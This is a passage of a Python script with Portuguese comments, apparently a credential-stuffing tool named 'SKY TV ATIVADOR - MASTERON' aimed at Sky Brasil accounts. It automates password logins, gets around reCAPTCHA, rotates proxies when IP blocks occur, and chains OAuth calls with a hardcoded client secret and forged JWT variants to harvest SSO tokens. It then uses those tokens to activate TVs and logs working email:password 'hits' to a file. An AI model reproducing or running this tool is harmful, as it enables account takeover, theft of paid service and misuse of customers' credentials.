                            urls_to_check.append(hloc)

            for u in urls_to_check:
                if not u:
                    continue
                parsed = urllib.parse.urlparse(u)
                for qs in [parsed.query, parsed.fragment]:
                    if not qs:
                        continue
                    qp = urllib.parse.parse_qs(qs)
                    for k, vals in qp.items():
                        if any(w in k.lower() for w in ["ssotoken", "sso_token", "token", "auth_token"]):
                            for val in vals:
                                tok = _clean_token(val)
                                if tok:
                                    return tok

            # 5. JSON na resposta (recursivo)
            if resp:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        for k, val in data.items():
                            if isinstance(val, str) and any(w in k.lower() for w in ["ssotoken", "sso_token", "token", "accesstoken", "access_token"]):
                                tok = _clean_token(val)
                                if tok:
                                    return tok
                            elif isinstance(val, dict):
                                for k2, val2 in val.items():
                                    if isinstance(val2, str) and any(w in k2.lower() for w in ["ssotoken", "sso_token", "token", "accesstoken", "access_token"]):
                                        tok = _clean_token(val2)
                                        if tok:
                                            return tok
                except Exception:
                    pass
            return None

        # Configura cookies de autenticação na sessão
        self.discovered_tbx_tokens = []
        for dom in [".vrioservices.com", "sm-sky.vrioservices.com"]:
            if web_access_token:
                self.session.cookies.set("accessToken", web_access_token, domain=dom)
                self.session.cookies.set("token", web_access_token, domain=dom)
            if jwt_token:
                self.session.cookies.set("id_token", jwt_token, domain=dom)
            if signature_id:
                self.session.cookies.set("signatureId", str(signature_id), domain=dom)

        # ── ETAPA 0: Inicia sessão OAuth na TBX para gerar o state oficial e cookies de sessão ──
        # Endpoint exato descoberto no fluxo do skymais.com.br/ativar:
        tbx_init_url = (
            "https://sp.tbxnet.com/v2/auth/authorize?"
            "client_id=dtvgo&response_type=code&"
            "redirect_uri=https%3A%2F%2Fwww.skymais.com.br%2Fativar&"
            "idp=sky_br&country=BR"
        )
        state = None
        oauth_url = None
        try:
            resp_init = self.session.get(
                tbx_init_url,
                headers={
                    "host":               "sp.tbxnet.com",
                    "user-agent":         USER_AGENT_WEB,
                    "accept":             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "referer":            ORIGIN_SKY + "/",
                    "accept-language":    "pt-BR,pt;q=0.9,en;q=0.8",
                },
                allow_redirects=False,
                timeout=20,
            )
            init_loc = resp_init.headers.get("Location") or resp_init.headers.get("location", "")
            if not init_loc and "<a href=" in resp_init.text:
                m = re.search(r'href=["\']([^"\']+)["\']', resp_init.text)
                if m:
                    init_loc = html.unescape(m.group(1))

            if init_loc:
                oauth_url = init_loc.replace("&amp;", "&")
                parsed_init = urllib.parse.urlparse(oauth_url)
                qp_init = urllib.parse.parse_qs(parsed_init.query)
                if "state" in qp_init:
                    state = qp_init["state"][0]
                    with print_lock:
                        print(f"{Fore.GREEN}  [✓] TBX Session iniciada! State oficial: {state[:30]}...{Style.RESET_ALL}")
                        for ck in self.session.cookies:
                            if "tbx" in (ck.domain or "").lower():
                                print(f"    [Cookie TBX Init] {ck.domain} | {ck.name} = {ck.value[:40]}")
        except Exception as e:
            with print_lock:
                print(f"  [TBX Init Session] Erro: {e}")

        if not state:
            state = secrets.token_hex(16)
            with print_lock:
                print(f"  [TBX Init Session] Fallback para state gerado: {state[:16]}")

        if not oauth_url:
            oauth_url = (
                f"https://sm-sky.vrioservices.com/v2/oauth2/authorize?"
                f"client_id=sky_br&country=BR&cp_convert=dtvgo&"
                f"failureRedirect=https%3A%2F%2Fwww.skymais.com.br%2Fativar&"
                f"redirect_uri=https%3A%2F%2Fsp.tbxnet.com%2Fv2%2Fauth%2Foauth2%2Fassert&"
                f"response_type=code&state={state}"
            )

        # ── ETAPA 1: Login OAuth no /v2/oauth2/authorize usando o state oficial da TBX ──
        if payload_web:
            try:
                rcap = get_recaptcha_web_token(payload_web, proxy=self.proxy_url)
                auth_body = {
                    "grantType":            "password",
                    "client_id":            "sky_br",
                    "countryCode":          "br",
                    "password":             password,
                    "g-recaptcha-response": rcap,
                    "redirect_uri":         "https://sp.tbxnet.com/v2/auth/oauth2/assert",
                    "response_type":        "code",
                    "state":                state,
                    "cp_convert":           "dtvgo",
                }
                if "@" in email:
                    auth_body["email"] = email
                else:
                    clean_d = re.sub(r"\D", "", email)
                    if len(clean_d) <= 11:
                        clean_d = clean_d.zfill(11)
                    auth_body["telephoneNumber"] = clean_d

                resp_oauth = self.session.post(
                    oauth_url,
                    headers={
                        "host":               "sm-sky.vrioservices.com",
                        "x-environment":      "prd",
                        "x-user-id":          "SiteSKY",
                        "x-api-key":          WEB_API_KEY,
                        "x-consumer-system":  "SiteSKY",
                        "x-client-type":      "web",
                        "user-agent":         USER_AGENT_WEB,
                        "origin":             ORIGIN_SKYUI,
                        "referer":            ORIGIN_SKYUI + "/",
                        "content-type":       "application/json",
                        "accept":             "application/json, text/html, */*",
                    },
                    json=auth_body,
                    timeout=25,
                    allow_redirects=False,
                )
                loc = resp_oauth.headers.get("Location") or resp_oauth.headers.get("location", "")
                with print_lock:
                    print(f"  [OAuth Authorize Login] HTTP {resp_oauth.status_code} -> Location: {loc[:80] if loc else resp_oauth.text[:80]}")

                # Extrai o auth_code retornado no JSON ou no Location
                auth_code = None
                state_ret = state
                try:
                    auth_json = resp_oauth.json()
                    auth_code = auth_json.get("code")
                    state_ret = auth_json.get("state") or state
                except Exception:
                    pass

                if not auth_code and loc:
                    parsed_loc = urllib.parse.urlparse(loc)
                    qp = urllib.parse.parse_qs(parsed_loc.query)
                    auth_code = qp.get("code", [None])[0]
                    state_ret = qp.get("state", [state])[0]

                if auth_code:
                    with print_lock:
                        print(f"{Fore.GREEN}  [✓] OAuth Code obtido: {auth_code}{Style.RESET_ALL}")

                    # 1. ASSERT OFICIAL VIA POST (com headers e credenciais completos da TBX)
                    try:
                        resp_assert_p = self.session.post(
                            "https://sp.tbxnet.com/v2/auth/oauth2/assert",
                            headers={
                                "authorization":    BASIC_AUTH,
                                "x-environment":    X_ENVIRONMENT,
                                "x-app":            X_APP,
                                "x-client-version": X_CLIENT_VER,
                                "user-agent":       USER_AGENT_WEB,
                                "content-type":     "application/x-www-form-urlencoded",
                                "accept":           "application/json, text/html, */*",
                                "origin":           ORIGIN_SKY,
                                "referer":          REFERER_SKY,
                            },
                            data={
                                "client_id":  "sky_br",
                                "country":    "BR",
                                "cp_convert": "dtvgo",
                                "code":       auth_code,
                                "state":      state_ret,
                            },
                            timeout=25,
                            allow_redirects=False,
                        )
                        loc_p = resp_assert_p.headers.get("Location") or resp_assert_p.headers.get("location", "")
                        with print_lock:
                            print(f"  [TBX Assert POST] HTTP {resp_assert_p.status_code} -> Loc: {loc_p[:70]} | Body: {resp_assert_p.text[:120]}")
                            for ck in list(resp_assert_p.cookies) + list(self.session.cookies):
                                if any(d in (ck.domain or "").lower() for d in ["tbx", "skymais", "directv"]):
                                    print(f"    [Cookie Assert POST] {ck.domain} | {ck.name} = {ck.value[:40]}")
                        tok = _extract_from_response(resp_assert_p, url=loc_p)
                        if tok:
                            return tok

                        # 2. ASSERT OFICIAL VIA GET (redirecionamento browser padrão)
                        resp_assert_g = self.session.get(
                            "https://sp.tbxnet.com/v2/auth/oauth2/assert",
                            params={
                                "code":       auth_code,
                                "state":      state_ret,
                                "client_id":  "sky_br",
                                "country":    "BR",
                                "cp_convert": "dtvgo",
                            },
                            headers={
                                "user-agent": USER_AGENT_WEB,
                                "accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "origin":     ORIGIN_SKY,
                                "referer":    REFERER_SKY,
                            },
                            timeout=25,
                            allow_redirects=True,
                        )
                        loc_g = resp_assert_g.headers.get("Location") or resp_assert_g.headers.get("location", "")
                        with print_lock:
                            print(f"  [TBX Assert GET] HTTP {resp_assert_g.status_code} -> URL: {resp_assert_g.url[:70]}")
                            for ck in list(resp_assert_g.cookies) + list(self.session.cookies):
                                if any(d in (ck.domain or "").lower() for d in ["tbx", "skymais", "directv"]):
                                    print(f"    [Cookie Assert GET] {ck.domain} | {ck.name} = {ck.value[:40]}")
                        tok = _extract_from_response(resp_assert_g, url=loc_g or resp_assert_g.url)
                        if tok:
                            return tok

                        # 2.1 Tenta obter id_token (sm-dgo) diretamente via OIDC authorize com a sessão TAD ativa
                        try:
                            resp_oidc = self.session.get(
                                "https://sp.tbxnet.com/v2/auth/authorize",
                                params={
                                    "client_id":     "dtvgo",
                                    "response_type": "id_token token",
                                    "scope":         "openid profile",
                                    "redirect_uri":  "https://www.skymais.com.br/ativar",
                                    "nonce":         secrets.token_hex(16),
                                },
                                headers={
                                    "user-agent": USER_AGENT_WEB,
                                    "accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                    "referer":    ORIGIN_SKY + "/ativar",
                                },
                                allow_redirects=False,
                                timeout=15,
                            )
                            loc_oidc = resp_oidc.headers.get("Location") or resp_oidc.headers.get("location", "")
                            if loc_oidc and ("id_token=" in loc_oidc or "access_token=" in loc_oidc):
                                tok_oidc = _extract_from_response(url=loc_oidc)
                                if tok_oidc:
                                    with print_lock:
                                        print(f"{Fore.GREEN}  [✓] TBX OIDC id_token obtido via sessão TAD! ({tok_oidc[:30]}...){Style.RESET_ALL}")
                                    return tok_oidc
                        except Exception:
                            pass

                        # 3. Pós-Assert: Extrai o código OAuth2 da TBX (dtvgo) e troca por access_token / ssoToken
                        tbx_code = None
                        for target_u in [loc_g, getattr(resp_assert_g, "url", ""), loc_p]:
                            if target_u and "code=" in target_u:
                                p_u = urllib.parse.urlparse(target_u)
                                qp_u = urllib.parse.parse_qs(p_u.query)
                                if "code" in qp_u:
                                    tbx_code = qp_u["code"][0]
                                    with print_lock:
                                        print(f"{Fore.GREEN}  [✓] TBX Auth Code (dtvgo) obtido: {tbx_code[:35]}...{Style.RESET_ALL}")
                                    self.discovered_tbx_tokens.append((tbx_code, "TBX Session Code (/ativar)"))
                                    break

                        device_token_found = None
                        post_assert_tests = []
                        if tbx_code:
                            # 1. Com client_secret e device_id (requisição de cliente confidencial completa)
                            post_assert_tests.append(("POST /token (tbx_code secret + device_id)", "https://sp.tbxnet.com/v2/auth/token", {
                                "grant_type":    "authorization_code",
                                "code":          tbx_code,
                                "client_id":     "dtvgo",
                                "client_secret": "Nd3kYaiEG8",
                                "redirect_uri":  "https://www.skymais.com.br/ativar",
                                "device_id":     DEFAULT_DEVICE_ID,
                                "scope":         "openid profile",
                            }))
                            # 2. Fallback sem scope
                            post_assert_tests.append(("POST /token (tbx_code secret)", "https://sp.tbxnet.com/v2/auth/token", {
                                "grant_type":    "authorization_code",
                                "code":          tbx_code,
                                "client_id":     "dtvgo",
                                "client_secret": "Nd3kYaiEG8",
                                "redirect_uri":  "https://www.skymais.com.br/ativar",
                            }))
                            # 3. Form simples padrão
                            post_assert_tests.append(("POST /token (tbx_code dtvgo form)", "https://sp.tbxnet.com/v2/auth/token", {
                                "grant_type":   "authorization_code",
                                "code":         tbx_code,
                                "client_id":    "dtvgo",
                                "redirect_uri": "https://www.skymais.com.br/ativar",
                            }))

                        for label, p_url, p_body in post_assert_tests:
                            for mode in ["form", "json"]:
                                try:
                                    hdrs = {
                                        "authorization":    BASIC_AUTH,
                                        "x-environment":    X_ENVIRONMENT,
                                        "x-app":            X_APP,
                                        "x-client-version": X_CLIENT_VER,
                                        "user-agent":       USER_AGENT_WEB,
                                        "origin":           ORIGIN_SKY,
                                        "referer":          REFERER_SKY,
                                    }
                                    if mode == "json":
                                        hdrs["content-type"] = "application/json"
                                        hdrs["accept"] = "application/json"
                                        r_post = self.session.post(p_url, headers=hdrs, json=p_body, timeout=12)
                                    else:
                                        hdrs["content-type"] = "application/x-www-form-urlencoded"
                                        hdrs["accept"] = "application/json"
                                        r_post = self.session.post(p_url, headers=hdrs, data=p_body, timeout=12)
                                    with print_lock:
                                        print(f"  [{label} {mode}] HTTP {r_post.status_code}: {r_post.text.strip().replace(chr(10), ' ')[:200]}")
                                    try:
                                        token_resp = r_post.json()
                                        if isinstance(token_resp, dict):
                                            with print_lock:
                                                print(f"    [Chaves retornadas]: {list(token_resp.keys())}")
                                            # Se vier explicitamente ssoToken ou id_token, é o token definitivo!
                                            for k_sso in ["ssoToken", "sso_token", "id_token", "idToken"]:
                                                if token_resp.get(k_sso):
                                                    sso_val = str(token_resp[k_sso]).strip('\"\'')
                                                    with print_lock:
                                                        print(f"{Fore.GREEN}  [✓] TBX {k_sso} obtido em {label}! ({sso_val[:30]}...){Style.RESET_ALL}")
                                                    return sso_val

                                            cand = (
                                                token_resp.get("access_token")
                                                or token_resp.get("token")
                                            )
                                            if cand:
                                                cand_str = str(cand).strip('\"\'')
                                                if cand_str.startswith("Bearer ") or cand_str.startswith("bearer "):
                                                    cand_str = cand_str[7:].strip()
                                                if len(cand_str) > 15 and not _is_vrio_jwt(cand_str):
                                                    ttype = str(token_resp.get("token_type", "")).lower()
                                                    if "device" in ttype:
                                                        if not device_token_found:
                                                            device_token_found = cand_str
                                                            with print_lock:
                                                                print(f"  [i] device_token capturado ({cand_str[:25]}...), sondando endpoints por ssoToken...")
                                                    else:
                                                        with print_lock:
                                                            print(f"{Fore.GREEN}  [✓] TBX Token obtido em {label}! ({cand_str[:30]}...){Style.RESET_ALL}")
                                                        return cand_str
                                    except Exception:
                                        pass

                                    tok = _extract_from_response(r_post)
                                    if tok:
                                        if device_token_found and tok == device_token_found:
                                            pass
                                        else:
                                            with print_lock:
                                                print(f"{Fore.GREEN}  [✓] TBX ssoToken obtido com sucesso em {label}!{Style.RESET_ALL}")
                                            return tok
                                except Exception:
                                    pass

                        # Sonda ativa de endpoints de sessão/perfis usando o device_token obtido
                        if device_token_found:
                            probe_headers_list = [
                                {"authorization": f"Bearer {device_token_found}", "x-device-id": DEFAULT_DEVICE_ID},
                                {"authorization": BASIC_AUTH, "x-device-token": device_token_found, "x-device-id": DEFAULT_DEVICE_ID},
                                {"authorization": BASIC_AUTH, "ssotoken": device_token_found, "x-device-id": DEFAULT_DEVICE_ID},
                            ]
                            for probe_label, probe_url in [
                                ("GET /userinfo", "https://sp.tbxnet.com/v2/auth/userinfo"),
                                ("GET /token/info", "https://sp.tbxnet.com/v2/auth/token/info"),
                                ("GET dtv /user", "https://dtv-oidc.tbxapis.com/v2/user"),
                                ("GET dtv /profiles", "https://dtv-oidc.tbxapis.com/v2/profiles"),
                                ("GET dtv /session", "https://dtv-oidc.tbxapis.com/v2/session"),
                            ]:
                                for ph in probe_headers_list:
                                    try:
                                        all_h = {
                                            **ph,
                                            "x-environment":    X_ENVIRONMENT,
                                            "x-app":            X_APP,
                                            "x-client-version": X_CLIENT_VER,
                                            "user-agent":       USER_AGENT_WEB,
                                            "origin":           ORIGIN_SKY,
                                            "referer":          REFERER_SKY,
                                            "accept":           "application/json, text/plain, */*",
                                        }
                                        r_pb = self.session.get(probe_url, headers=all_h, timeout=8)
                                        if r_pb.status_code in (200, 201):
                                            with print_lock:
                                                print(f"{Fore.GREEN}  [✓ Probe OK] {probe_label} HTTP {r_pb.status_code}: {r_pb.text.strip().replace(chr(10), ' ')[:200]}{Style.RESET_ALL}")
                                            tok_pb = _extract_from_response(r_pb)
                                            if tok_pb and tok_pb != device_token_found:
                                                return tok_pb
                                    except Exception:
                                        pass

                        # Registra cookies relevantes da TBX
                        for ck in self.session.cookies:
                            if any(w in (ck.name or "").lower() for w in ["tad", "token", "sso"]):
                                self.discovered_tbx_tokens.append((ck.value, f"TBX Cookie {ck.name}"))

                        # Se encontrou device_token, registra
                        if device_token_found:
                            self.discovered_tbx_tokens.append((device_token_found, "TBX device_token"))
                            return device_token_found

                    except Exception as e:
                        with print_lock:
                            print(f"  [TBX Assert POST] Erro: {e}")

                # Fallback Location direto se houver
                tok = _extract_from_response(resp_oauth)
                if tok:
                    return tok
                if loc:
                    parsed_loc = urllib.parse.urlparse(loc)
                    if any(dom in parsed_loc.netloc.lower() for dom in ["tbxnet.com", "skymais.com.br"]):
                        with print_lock:
                            print(f"{Fore.GREEN}  [OAuth] Redirecionamento TBX obtido: {loc[:75]}...{Style.RESET_ALL}")
                        resp_tbx = self.session.get(
                            loc,
                            headers={
                                "user-agent": USER_AGENT_WEB,
                                "accept":     "application/json, text/html, */*",
                                "origin":     ORIGIN_SKY,
                                "referer":    REFERER_SKY,
                            },
                            timeout=25,
                            allow_redirects=True,
                        )
                        tok = _extract_from_response(resp_tbx)
                        if tok:
                            return tok
            except Exception as e:
                with print_lock:
                    print(f"  [OAuth Authorize Login] Erro: {e}")

        return None

    _authorize_oauth = _fetch_sso_token_tbx

    # ----------------------------------------------------------
    # LOGIN — copia exata do sky.py que funciona
    # ----------------------------------------------------------
    def login(self, email: str, password: str,
              payload_android: Optional[str] = None,
              payload_web: Optional[str] = None) -> dict:
        """
        Retorna dict com 'access_token' em sucesso, ou 'error' em falha.
        Usa exatamente o mesmo fluxo do sky.py.
        """
        is_email = "@" in email

        for attempt in range(4):
            try:
                if is_email and payload_android:
                    # ── ROTA ANDROID (igual ao sky.py) ──────────────────────
                    new_payload, session_id = update_payload_session_id(payload_android)
                    recaptcha_token = get_recaptcha_token(new_payload, proxy=self.proxy_url)

                    device_id = hex(int(time.time() * 1000))[2:15]
                    auth_payload = {
                        "email": email,
                        "grantType": "password",
                        "password": password,
                        "g-recaptcha-response": recaptcha_token,
                    }
                    headers = {
                        "session-id":       session_id,
                        "appversion":       "7.116.0",
                        "consumer-key":     "ANDROID",
                        "user-agent":       "minhaskyandroid",
                        "x-api-key":        MOBILE_API_KEY,
                        "x-consumer-system": "Mobile",
                        "x-user-id":        "APP",
                        "x-group-code":     "APP",
                        "device-id":        device_id,
                        "x-client-type":    "app",
                        "x-environment":    "prd",
                        "content-type":     "application/json",
                    }
                    resp = self.session.post(
                        AUTH_URL_ANDROID, headers=headers, json=auth_payload, timeout=30
                    )

                elif not is_email and payload_web:
                    # ── ROTA WEB para CPF/telefone (igual ao sky.py) ─────────
                    clean_digits = re.sub(r"\D", "", email)
                    recaptcha_token = get_recaptcha_web_token(payload_web, proxy=self.proxy_url)

                    headers = {
                        "host":               "sm-sky.vrioservices.com",
                        "x-environment":      "prd",
                        "x-user-id":          "SiteSKY",
                        "x-api-key":          WEB_API_KEY,
                        "x-consumer-system":  "SiteSKY",
                        "x-client-type":      "web",
                        "content-type":       "application/json",
                        "origin":             "https://www.sky.com.br",
                        "referer":            "https://www.sky.com.br/",
                        "user-agent":         USER_AGENT_WEB,
                    }
                    auth_payload = {
                        "grantType":        "password",
                        "telephoneNumber":  clean_digits,
                        "password":         password,
                        "g-recaptcha-response": recaptcha_token,
                    }
                    resp = self.session.post(
                        AUTH_URL_WEB, headers=headers, json=auth_payload, timeout=30
                    )

                else:
                    # Sem payload disponivel — nao tem como fazer reCAPTCHA
                    return {"error": "Payload reCAPTCHA nao disponivel para esse tipo de conta"}

            except Exception as e:
                if attempt < 3:
                    if self.use_proxy and attempt >= 1:
                        self._new_session(force_direct=True)
                    else:
                        self._new_session()
                    time.sleep(1)
                    continue
                return {"error": f"Erro de rede: {e}"}

            # ── Sucesso ──────────────────────────────────────────────
            if resp.status_code == 200:
                data = resp.json()
                access_token   = data.get("accessToken", "")
                refresh_token  = data.get("refreshToken", "")
                signatures     = data.get("signatures", [])
                customer       = data.get("customer", {})
                cpf            = customer.get("cpf", "")
                # Tenta trocar refreshToken por JWT ssoToken
                sso_token = self._exchange_token_for_sso(refresh_token)
                return {
                    "access_token":  access_token,
                    "refresh_token": refresh_token,
                    "sso_token":     sso_token,
                    "signatures":    signatures,
                    "cpf":           cpf,
                    "raw":           data,
                }

            # ── IP bloqueado ─────────────────────────────────────────
            if resp.status_code in (403, 429):
                with print_lock:
                    print(f"{Fore.CYAN}  [Proxy] IP bloqueado (HTTP {resp.status_code}), trocando...{Style.RESET_ALL}")
                if self.use_proxy and attempt >= 1:
                    with print_lock:
                        print(f"{Fore.YELLOW}  [Proxy -> Direto] Tentando conexao direta sem proxy...{Style.RESET_ALL}")
                    self._new_session(force_direct=True)
                else:
                    self._new_session()
                time.sleep(1)
                continue

            # ── Credenciais invalidas ────────────────────────────────
            if resp.status_code in (400, 401):
                try:
                    err_data = resp.json()
                except Exception:
                    err_data = {}
                msg = (err_data.get("error_description")
                       or err_data.get("message")
                       or resp.text[:200])
                invalid_kw = ["invalid_grant", "unauthorized", "user or password",
                               "subscriber not found", "attempts exceeded", "invalid_password"]
                if any(p in msg.lower() for p in invalid_kw):
                    return {"error": f"Credenciais invalidas: {msg}"}
                # reCAPTCHA falhou — tenta de novo
                if "recaptcha" in msg.lower() or "captcha" in msg.lower():
                    with print_lock:
                        print(f"{Fore.YELLOW}  [reCAPTCHA] Falhou, retentando...{Style.RESET_ALL}")
                    if attempt < 3:
                        time.sleep(1)
                        continue
                return {"error": f"Falha ({resp.status_code}): {msg}"}

            # ── Outro erro ───────────────────────────────────────────
            if attempt < 3:
                if self.use_proxy and attempt >= 1:
                    self._new_session(force_direct=True)
                else:
                    self._new_session()
                time.sleep(1)
                continue
            return {"error": f"Falha ({resp.status_code}): {resp.text[:200]}"}

        return {"error": "Esgotaram as tentativas de login"}

    # ----------------------------------------------------------
    # ATIVACAO DE TV
    # ----------------------------------------------------------
    def activate_tv(self, token: str, tv_code: str,
                    profile_token: Optional[str] = None) -> dict:
        """
        Ativa a TV via POST https://dtv-oidc.tbxapis.com/v2/tv/activation
        Utiliza os headers e tokens mapeados diretamente da requisição HTTP/2 real do Sky+.
        """
        # Extrai deviceId contido no payload do JWT ssoToken (o TBX exige correspondência exata)
        device_id = None
        if token and "." in token:
            try:
                parts = token.split(".")
                if len(parts) >= 2:
                    p = parts[1]
                    try:
                        decoded = json.loads(p)
                    except Exception:
                        rem = len(p) % 4
                        if rem:
                            p += "=" * (4 - rem)
                        decoded = json.loads(base64.urlsafe_b64decode(p))
                    device_id = (decoded.get("deviceId")
                                 or decoded.get("tbxDeviceId")
                                 or decoded.get("vrioDeviceId"))
            except Exception:
                pass

        if not device_id:
            device_id = DEFAULT_DEVICE_ID

        active_profile = profile_token

        base_headers = {
            "host":               "dtv-oidc.tbxapis.com",
            "x-environment":      X_ENVIRONMENT,
            "sec-ch-ua-platform": '"Windows"',
            "authorization":      BASIC_AUTH,
            "x-device-id":        device_id,
            "sec-ch-ua":          '"Not;A=Brand";v="8", "Chromium";v="150", "Microsoft Edge";v="150"',
            "sec-ch-ua-mobile":   "?0",
            "x-app":              X_APP,
            "user-agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
            "accept":             "application/json, text/plain, */*",
            "x-client-version":   X_CLIENT_VER,
            "content-type":       "application/json",
            "x-client-id":        "web",
            "origin":             ORIGIN_SKY,
            "referer":            REFERER_SKY,
            "sec-fetch-site":     "cross-site",
            "sec-fetch-mode":     "cors",
            "sec-fetch-dest":     "empty",
            "accept-language":    "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "priority":           "u=1, i",
        }

        payload = {"userCode": tv_code.strip().upper()}

        variant_tokens = [token]
        if token and "." in token:
            parts = token.split(".")
            if len(parts) == 3:
                raw_p = parts[1]
                if "eyJ1dWlkIjoi" in raw_p:
                    json_str = raw_p.replace("eyJ1dWlkIjoi", '{"uuid":"')
                    try:
                        b64_p = base64.urlsafe_b64encode(json_str.encode("utf-8")).decode().rstrip("=")
                        variant_tokens.append(f"{parts[0]}.{b64_p}.{parts[2]}")
                    except Exception:
                        pass
                    variant_tokens.append(f"{parts[0]}.{json_str}.{parts[2]}")

        if not token:
            return {
                "success": False,
                "message": "Nenhum token válido fornecido para esta conta.",
            }

        # NUNCA utilizar profile_token de outra conta! Se não foi fornecido para este token/conta, active_profile deve ser None
        active_profile = profile_token

        token_variants = []
        if active_profile:
            token_variants.append(("TBX Oficial (ssotoken + x-profile-token)", {
                "authorization":   BASIC_AUTH,
                "ssotoken":        token,
                "x-profile-token": active_profile,
            }))
        token_variants.append(("TBX (ssotoken)", {
            "authorization": BASIC_AUTH,
            "ssotoken":      token,
        }))
        if "ey" not in token and len(token) >= 32:
            token_variants.append(("TBX (x-device-token)", {
                "authorization": BASIC_AUTH,
                "x-device-token": token,
            }))

        endpoints = [
            ACTIVATE_URL,
        ]

        sessions = [("Proxy" if self.use_proxy else "Direto", self.session)]
        if self.use_proxy:
            # Fallback direto caso o proxy residencial tenha instabilidade ou timeout
            try:
                direct_session = cloudscraper.create_scraper(
                    browser={"browser": "chrome", "platform": "android", "desktop": False},
                    delay=1,
                )
                sessions.append(("Direto (Fallback)", direct_session))
            except Exception:
                pass

        last_error = ""
        for sess_name, sess in sessions:
            for ep in endpoints:
                for var_name, extra in token_variants:
                    hdrs = {**base_headers, **extra}
                    try:
                        resp = sess.post(ep, headers=hdrs, json=payload, timeout=12)
                    except Exception as e:
                        last_error = f"Erro de rede ({sess_name}): {e}"
                        continue

                    msg = ""
                    try:
                        err_data = resp.json()
                        msg = (err_data.get("error_description")
                                or err_data.get("message")
                                or err_data.get("error")
                                or resp.text[:120])
                    except Exception:
                        msg = resp.text[:120]

                    if resp.status_code in (200, 201, 204):
                        try:
                            resp_data = resp.json()
                        except Exception:
                            resp_data = {}
                        with print_lock:
                            print(f"{Fore.GREEN}    [{var_name}] HTTP {resp.status_code}: Ativado com sucesso!{Style.RESET_ALL}")
                        return {
                            "success": True,
                            "message": resp_data.get("message") or "TV ativada com sucesso!",
                            "raw":     resp_data,
                        }

                    last_error = f"HTTP {resp.status_code}: {msg}"
                    with print_lock:
                        print(f"    [{var_name}] HTTP {resp.status_code}: {msg}")

                    # Se for 404: código da TV não encontrado na base ou expirado
                    if resp.status_code == 404 or "not found" in msg.lower() or "expirado" in msg.lower():
                        return {
                            "success": False,
                            "message": f"Código {tv_code} não encontrado ou expirado na TV (HTTP 404)",
                            "not_found": True,
                        }

            if "404" in last_error or "não encontrado" in last_error:
                break

        return {"success": False, "message": last_error or "Falha na ativacao"}

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass


# ============================================================
# DISPLAY
# ============================================================
def print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    borda = "\u2550" * 42
    print(f"{Fore.CYAN}{Style.BRIGHT}\u2554{borda}\u2557{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}\u2551      SKY TV ATIVADOR - MASTERON          \u2551{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}\u2551  Login automatico + Ativacao via codigo  \u2551{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}\u255a{borda}\u255d{Style.RESET_ALL}")
    print()

def print_success(email: str, tv_code: str, message: str):
    with print_lock:
        print(f"\n{Fore.GREEN}\u2554\u2550\u2550\u2550[ATIVACAO BEM-SUCEDIDA]\u2550\u2550\u2550\u2557{Style.RESET_ALL}")
        print(f"{Fore.GREEN}\u2551 Conta : {email}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}\u2551 Codigo: {tv_code}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}\u2551 Status: {message}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}\u255a\u2550\u2550\u2550[@Masteron]\u2550\u2550\u2550\u255d{Style.RESET_ALL}\n")

def print_fail(email: str, tv_code: str, reason: str):
    with print_lock:
        print(f"{Fore.RED}\u2717 [{email}] -> {reason}{Style.RESET_ALL}")

def save_activation_log(email: str, password: str, tv_code: str, success: bool, message: str):
    os.makedirs("hits", exist_ok=True)
    log_path = os.path.join("hits", "ativacoes_tv.txt")
    status = "SUCESSO" if success else "FALHA"
    line = f"[{status}] {email}:{password} | Codigo: {tv_code} | {message}\n"
    try:
        with open(log_path, "a", encoding="utf-8", errors="replace") as f:
            f.write(line)
    except Exception:
        pass

# ============================================================
# FLUXO PRINCIPAL
# ============================================================
def activate_with_account(
    email: str, password: str, tv_code: str,
    use_proxy: bool = True,
    payload_android: Optional[str] = None,
    payload_web: Optional[str] = None,
    stop_event: Optional[threading.Event] = None,
) -> bool:
    activator = SkyTVActivator(use_proxy=use_proxy)
    try:
        with print_lock:
            proxy_tag = "[Proxy DataImpulse]" if use_proxy else "[Sem proxy]"
            print(f"{Fore.YELLOW}Login: {email} {proxy_tag}{Style.RESET_ALL}")

        # ── 1. Verifica se já temos dados e token salvos em hits/raw_json ──
        cached_data = get_cached_hit_data(email)
        cached_jwt = cached_data.get("jwt_token") if cached_data else None
        cached_cpf = (cached_data.get("raw_data", {}).get("customer", {}).get("cpf")
                      or cached_data.get("customer", {}).get("cpf")) if cached_data else None
        cached_signatures = (cached_data.get("active_signatures")
                             or cached_data.get("raw_data", {}).get("signatures")
                             or []) if cached_data else []

        # ── 2. Login na conta ──
        auth_info = activator.login(email, password, payload_android, payload_web)
        if "error" in auth_info:
            print_fail(email, tv_code, f"Login: {auth_info['error']}")
            save_activation_log(email, password, tv_code, False, f"Login: {auth_info['error']}")
            return False

        access_token = auth_info.get("access_token", "")
        refresh_token = auth_info.get("refresh_token", "")
        signatures = auth_info.get("signatures", []) or cached_signatures
        user_cpf = auth_info.get("cpf") or cached_cpf

        preview = access_token[:25] if access_token else "nenhum"
        with print_lock:
            print(f"{Fore.CYAN}  Login OK! accessToken: {preview}...{Style.RESET_ALL}")

        candidate_tokens: List[Tuple[str, str]] = []  # (token, descricao)

        # ── 3. Obtém Web Access Token (necessário para OAuth e fetch_id_token) ──
        is_email = "@" in email
        web_access_token = access_token if not is_email else None
        if is_email and payload_web:
            with print_lock:
                print(f"{Fore.YELLOW}  [+] Obtendo web_access_token...{Style.RESET_ALL}")
            web_access_token = activator.get_web_access_token(
                email, password, payload_web, cpf=user_cpf
            )
            if web_access_token:
                with print_lock:
